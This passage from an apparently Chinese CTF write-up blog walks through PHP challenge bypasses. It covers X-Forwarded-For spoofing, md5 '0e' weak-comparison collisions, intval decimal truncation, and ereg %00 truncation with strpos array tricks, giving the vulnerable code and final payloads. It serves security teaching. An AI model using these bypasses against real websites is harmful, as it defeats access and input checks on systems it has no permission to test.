title=\"X-Forwarded-For绕过指定IP地址\"></a>X-Forwarded-For绕过指定IP地址</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">GetIP</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"HTTP_CLIENT_IP\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token variable\">$cip</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"HTTP_CLIENT_IP\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"HTTP_X_FORWARDED_FOR\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token variable\">$cip</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"HTTP_X_FORWARDED_FOR\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"REMOTE_ADDR\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token variable\">$cip</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"REMOTE_ADDR\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">else</span>\n    <span class=\"token variable\">$cip</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"0.0.0.0\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">return</span> <span class=\"token variable\">$cip</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$GetIPs</span> <span class=\"token operator\">=</span> <span class=\"token function\">GetIP</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$GetIPs</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"1.1.1.1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Great! Key is *********\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"错误！你的IP不在访问列表之内！\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>做这道题之前不妨先了解一下<code>HTTP_CLIENT_IP</code>、<code>X_FORWARDED_FOR</code>和<code>REMOTE_ADDR</code></p>\n<p>HTTP_CLIENT_IP 是代理服务器发送的HTTP头</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">HTTP_CLIENT_IP</span> 是代理服务器发送的<span class=\"token constant\">HTTP</span>头，<span class=\"token constant\">HTTP_CLIENT_IP</span>确实存在于http请求的header里。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>X_FORWARDED_FOR</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP<br>代理或者负载均衡服务器时才会添加该项，正如上面所述,当你使用了代理时,web服务器就不知道你的真实IP了,为了避免这个情况,代理服务器通常会增加一个叫做x_forwarded_for的头信息,把连接它的客户端IP(即你的上网机器IP)加到这个头信息里,这样就能保证网站的web服务器能获取到真实IP</p></blockquote>\n<p>REMOTE_ADDR</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>表示发出请求的远程主机的 IP<br>地址，remote_addr代表客户端的IP，但它的值不是由客户端提供的，而是服务端根据客户端的ip指定的，当你的浏览器访问某个网站时，假设中间没有任何代理，那么网站的web服务器（Nginx，Apache等）就会把remote_addr设为你的机器IP，如果你用了某个代理，那么你的浏览器会先访问这个代理，然后再由这个代理转发到网站，这样web服务器就会把remote_addr设为这台代理机器的IP</p></blockquote>\n<p>简单的总结一下就是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//访问端（有可能是用户，有可能是代理的）IP</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_CLIENT_IP'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//代理端的（有可能存在，可伪造）</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_X_FORWARDED_FOR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//用户是在哪个IP使用的代理（有可能存在，也可以伪造）</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>具体参考文献<br><a href=\"https://www.cnblogs.com/luxiaojun/p/10451860.html\">https://www.cnblogs.com/luxiaojun/p/10451860.html</a><br><a href=\"https://www.cnblogs.com/isungge/p/5711031.html\">https://www.cnblogs.com/isungge/p/5711031.html</a><br>因此我们这里的话可以尝试伪造XFF头来进行绕过<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528334.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"md5加密相等绕过\"><a href=\"#md5加密相等绕过\" class=\"headerlink\" title=\"md5加密相等绕过\"></a>md5加密相等绕过</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$md51</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'QNKCDZO'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> @<span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$md52</span> <span class=\"token operator\">=</span> @<span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token operator\">!=</span> <span class=\"token string single-quoted-string\">'QNKCDZO'</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$md51</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$md52</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"nctf&#123;*****************&#125;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"false!!!\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"please input a\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>两个条件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$a</span> <span class=\"token operator\">!=</span> <span class=\"token string single-quoted-string\">'QNKCDZO'</span>\n<span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'QNKCDZO'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>我们不妨先看一下md5加密后的QNKCDZO的值</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">0e830400451993494058024219903391</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>按照PHP的算法，这种会被认为是科学计数法，这里也会被视为<code>0*10的830400451993494058024219903391次方</code>，0乘任何都为0，这里要求的是两个=，也就是弱比较，此时只需要满足值相同就可以绕过，也就是说我们只需要再找一个满足md5加密后值为0exxx即可，这种数有很多，这里随便列出几个</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">s155964671a\ns214587387a\ns1091221200a\ns1502113478a\ns1665632922a<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>构造最终payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">a<span class=\"token operator\">=</span>s1665632922a<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528326.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"intval函数四舍五入\"><a href=\"#intval函数四舍五入\" class=\"headerlink\" title=\"intval函数四舍五入\"></a>intval函数四舍五入</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>id<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n   <span class=\"token function\">mysql_connect</span><span class=\"token punctuation\">(</span><span class=\"token constant\">SAE_MYSQL_HOST_M</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">':'</span> <span class=\"token operator\">.</span> <span class=\"token constant\">SAE_MYSQL_PORT</span><span class=\"token punctuation\">,</span><span class=\"token constant\">SAE_MYSQL_USER</span><span class=\"token punctuation\">,</span><span class=\"token constant\">SAE_MYSQL_PASS</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">mysql_select_db</span><span class=\"token punctuation\">(</span><span class=\"token constant\">SAE_MYSQL_DB</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$id</span> <span class=\"token operator\">=</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>id<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$query</span> <span class=\"token operator\">=</span> @<span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select content from ctf2 where id='<span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>'\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>id<span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p>no! try again&lt;/p>\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$query</span><span class=\"token punctuation\">[</span>content<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>学习intval函数可以看我的这篇文章，之前针对这个intval做过一个简单的总结<a href=\"https://www.quan9i.top/2022/05/15/php%E7%89%B9%E6%80%A7%E4%B9%8Bintval%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/\">https://www.quan9i.top/2022/05/15/php特性之intval学习小记</a><br>接下来开始说一下这道题</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">mysql_connect</span><span class=\"token punctuation\">(</span><span class=\"token constant\">SAE_MYSQL_HOST_M</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">':'</span> <span class=\"token operator\">.</span> <span class=\"token constant\">SAE_MYSQL_PORT</span><span class=\"token punctuation\">,</span><span class=\"token constant\">SAE_MYSQL_USER</span><span class=\"token punctuation\">,</span><span class=\"token constant\">SAE_MYSQL_PASS</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这个呢，其实就是PHP连接SAE平台mysql的，我们理解为连接数据库即可，接着看<br>整体看过后，发现重点大致是这几句</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span> 、<span class=\"token variable\">$id</span> <span class=\"token operator\">=</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>id<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$query</span> <span class=\"token operator\">=</span> @<span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select content from ctf2 where id='<span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>'\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token number\">2</span>、<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>id<span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>第二个语句是<code>$_GET[id]</code>不等于1024时才往下执行，但好端端的为什么要提到这个1024呢，往下运行是输出查询结果，这是不是间接的说明id为1024时对应的内容为flag呢，因此我们这里去构造一个1024即可，但等于1024又无法往下运行，这个时候就关注到了查询语句中是<code>$id</code>，而<code>$id</code>是<code>intval($_GET[id])</code>，因此这里就可以用intval的几个特性来绕过了<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528521.png\" alt=\"在这里插入图片描述\"><br>从官方例子中也可以看出，小数点后不计，那我们这里传值1024.2，在查询时不也是1024吗，而且后面检测是否为1024时还可以绕过检测，因此最终payload为</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">id<span class=\"token operator\">=</span><span class=\"token number\">1024.2</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"strpos数组绕过NULL与ereg正则-00截断\"><a href=\"#strpos数组绕过NULL与ereg正则-00截断\" class=\"headerlink\" title=\"strpos数组绕过NULL与ereg正则%00截断\"></a>strpos数组绕过NULL与ereg正则%00截断</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"flag\"</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'nctf'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>@<span class=\"token function\">ereg</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"^[1-9]+$\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'nctf'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'必须输入数字才行'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strpos</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'nctf'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'#biubiubiu'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> <span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span>   \n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Flag: '</span><span class=\"token operator\">.</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">else</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'骚年，继续努力吧啊~'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n <span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以看到这里的话是两个条件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、@<span class=\"token function\">ereg</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"^[1-9]+$\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'nctf'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token constant boolean\">TRUE</span>\n<span class=\"token number\">2</span>、<span class=\"token function\">strpos</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'nctf'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'#biubiubiu'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> <span class=\"token constant boolean\">FALSE</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>简单的说其实就是这个nctf参数只能由数字组成，但想要flag就需要在参数nctf中出现<code>#biubiubiu</code>，因此这里的话我们就需要用到之前的知识了，</p>\n<h3 id=\"00截断\"><a href=\"#00截断\" class=\"headerlink\" title=\"%00截断\"></a>%00截断</h3><p>当语句遇到%00时，会认为是休止符，不再往后看，即使后面还有语句<br>因此这里的话我们可以在给nctf进行赋值时，加上%00，然后后面加上我们的<code>#biubiubiu</code>，此时就可以成功绕过，构造最终payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">nctf<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">23</span>biubiubiu<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h3 id=\"数组绕过\"><a href=\"#数组绕过\" class=\"headerlink\" title=\"数组绕过\"></a>数组绕过</h3><p>前面做题时也提到过，当函数中要求的是字符串时，我们提交的如果是数组，那么就会报错，然后返回Null，这里的话我们看一下strpos函数<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528400.png\" alt=\"在这里插入图片描述\"><br>要求的同样是字符串，我们填数组的话会报出Null，此时它的第二个条件就变成了</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">Null</span> <span class=\"token operator\">!==</span><span class=\"token constant boolean\">FALSE</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这个条件是满足的，因为<code>!==</code>是强比较，不仅比较值，还比较类型，我们也可以自己本地测试一下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;br>'</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token constant\">null</span> <span class=\"token operator\">!=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;br>'</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token constant\">null</span> <span class=\"token operator\">!==</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" 